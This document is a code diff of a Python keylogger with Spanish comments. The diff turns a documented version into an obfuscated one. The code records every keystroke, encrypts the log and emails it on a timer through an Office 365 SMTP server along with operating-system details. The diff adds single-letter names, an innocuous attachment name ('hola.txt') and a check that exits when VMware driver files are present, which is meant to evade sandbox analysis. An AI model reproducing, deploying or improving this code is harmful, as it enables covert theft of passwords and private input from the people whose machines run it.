@@ -1,139 +1,108 @@
-"""
-Keylogger para capturar teclas, cifrar los datos y enviarlos por correo electrónico.
-
-"""
-
 import os
 import smtplib
-import threading
-import argparse
 import sys
+import platform
+import time
+import random
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import platform
-
 from cryptography.fernet import Fernet
 from pynput import keyboard
 from dotenv import load_dotenv
 
 load_dotenv()
 
-class Keylogger:
-    """
-    Clase para capturar teclas, cifrar los datos y enviarlos por correo electrónico.
-    """
+class K:
+    def __init__(self, e, p, r):
+        self.l = ""
+        self.e = e
+        self.p = p
+        self.r = r
+        self.i = 60  # Intervalo predefinido de 60 segundos
+        self.k = self.lk()
+        self.cs = Fernet(self.k)
+        self.check_vm()
 
-    def __init__(self, email: str, password: str, recipient: str, interval: int):
-        """
-        Inicializa el keylogger con las credenciales de correo y destinatario.
-
-        :param email: Dirección de correo del remitente
-        :param password: Contraseña del correo del remitente
-        :param recipient: Dirección de correo del destinatario
-        :param interval: Intervalo en segundos para enviar los correos
-        """
-        self.log = ""
-        self.email = email
-        self.password = password
-        self.recipient = recipient
-        self.interval = interval
-        self.key = self.load_key()
-        self.cipher_suite = Fernet(self.key)
-
-    def load_key(self) -> bytes:
-        """
-        Carga la clave de cifrado desde un archivo.
-
-        :return: Clave de cifrado en bytes
-        """
-        passfile = os.environ.get("passfile")
-        if not passfile:
-            print("Error: La variable de entorno 'passfile' no está definida.")
+    def lk(self):
+        pf = os.environ.get("pf")
+        if not pf:
             sys.exit(1)
-        return open(passfile, 'rb').read()
+        return open(pf, 'rb').read()
 
-    def on_press(self, key: keyboard.Key):
-        """
-        Callback para manejar la captura de teclas.
-
-        :param key: Tecla presionada
-        """
+    def op(self, k):
         try:
-            if key.char is not None:
-                self.log += key.char
+            if k.char:
+                self.l += k.char
         except AttributeError:
-            if key == keyboard.Key.space:
-                self.log += " "
+            if k == keyboard.Key.space:
+                self.l += " "
             else:
-                self.log += f" {str(key)} "
+                self.l += f" {str(k)} "
 
-    def encrypt_log(self) -> bytes:
-        """
-        Cifra el log de teclas capturadas.
+    def el(self):
+        encrypted_log = self.cs.encrypt(self.l.encode())
+        return encrypted_log
 
-        :return: Log cifrado en bytes
-        """
-        return self.cipher_suite.encrypt(self.log.encode())
-
-    def send_mail(self):
-        """
-        Envía el log cifrado por correo electrónico según el intervalo especificado.
-        """
-        if self.log:
+    def sm(self):
+        if self.l:
             try:
-                encrypted_log = self.encrypt_log()
-                print("Encrypted log:", encrypted_log)  # Imprimir el log cifrado
-
-                # Crear el mensaje del correo electrónico
+                el = self.el()
                 msg = MIMEMultipart()
-                msg['From'] = self.email
-                msg['To'] = self.recipient
-                msg['Subject'] = "Log de teclas cifrado"
+                msg['From'] = self.e
+                msg['To'] = self.r
+                msg['Subject'] = "EL"
 
-                # Adjuntar el log cifrado como un archivo de texto
                 part = MIMEBase('application', 'octet-stream')
-                part.set_payload(encrypted_log)
+                part.set_payload(el)
                 encoders.encode_base64(part)
-                part.add_header('Content-Disposition', 'attachment; filename="log.txt"')
+                part.add_header('Content-Disposition',
+                                'attachment; filename="hola.txt"')
                 msg.attach(part)
 
-                # Información del sistema operativo
-                system_info = f"Sistema operativo: {platform.system()} {platform.release()} ({platform.version()})"
-                msg.attach(MIMEText(system_info, 'plain'))
+                si = f"OS: {platform.system()} {platform.release()} ({platform.version()})"
+                msg.attach(MIMEText(si, 'plain'))
 
-                # Conectar al servidor SMTP y enviar el correo
                 server = smtplib.SMTP('smtp.office365.com', 587)
                 server.starttls()
-                server.login(self.email, self.password)
+                server.login(self.e, self.p)
                 server.send_message(msg)
                 server.quit()
             except smtplib.SMTPException as e:
-                print(f"Error al enviar correo: {e}")
-            self.log = ""
-        threading.Timer(self.interval, self.send_mail).start()
+                print(f"error: {e}")
+            self.l = ""
+
+    def check_vm(self):
+        vm_files = [
+            "C:\\windows\\system32\\drivers\\vmmouse.sys",
+            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
+            "C:\\windows\\system32\\drivers\\vmxnet.sys",
+            "/usr/bin/vmware-vmblock-fuse",
+            "/usr/bin/vmware-guestd",
+            "/usr/bin/vmtoolsd",
+        ]
+        for file in vm_files:
+            if os.path.exists(file):
+                sys.exit()
 
     def start(self):
-        """
-        Inicia el keylogger y el envío periódico de correos electrónicos.
-        """
-        listener = keyboard.Listener(on_press=self.on_press)
+        listener = keyboard.Listener(on_press=self.op)
         listener.start()
-        self.send_mail()
-        listener.join()
+
+        try:
+            while True:
+                time.sleep(self.i)
+                self.sm()
+        except KeyboardInterrupt:
+            listener.stop()
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Keylogger para capturar teclas y enviar logs cifrados por correo electrónico.")
-    parser.add_argument('--interval', type=int, required=True, help='Intervalo en segundos para enviar los correos.')
-    parser.add_argument('--recipient', type=str, required=True, help='Dirección de correo del destinatario.')
-    args = parser.parse_args()
-
-    keylogger = Keylogger(
-        email=os.environ.get("email"),
-        password=os.environ.get("password"),
-        recipient=args.recipient,
-        interval=args.interval
+    k = K(
+        e=os.environ.get("e"),
+        p=os.environ.get("p"),
+        r=os.environ.get("r"),
     )
-    keylogger.start()
+    k.start()
